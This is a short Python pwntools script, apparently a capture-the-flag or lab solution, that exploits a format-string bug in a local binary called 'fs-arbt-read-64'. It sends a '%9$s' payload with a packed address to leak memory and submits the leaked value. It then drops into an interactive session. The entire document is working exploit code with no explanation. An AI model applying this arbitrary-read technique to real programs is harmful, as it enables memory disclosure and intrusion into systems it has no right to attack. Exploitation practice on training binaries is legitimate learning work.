from pwn import *
p = process("./fs-arbt-read-64")
p.sendline("%9$s\x00\x00\x00\x00" + p64(0x60109c))
p.recvuntil("llo ")
x =p.recvline(timeout=1)
x = x[:-1]
p.sendline(hex(u32(x)))
p.interactive()

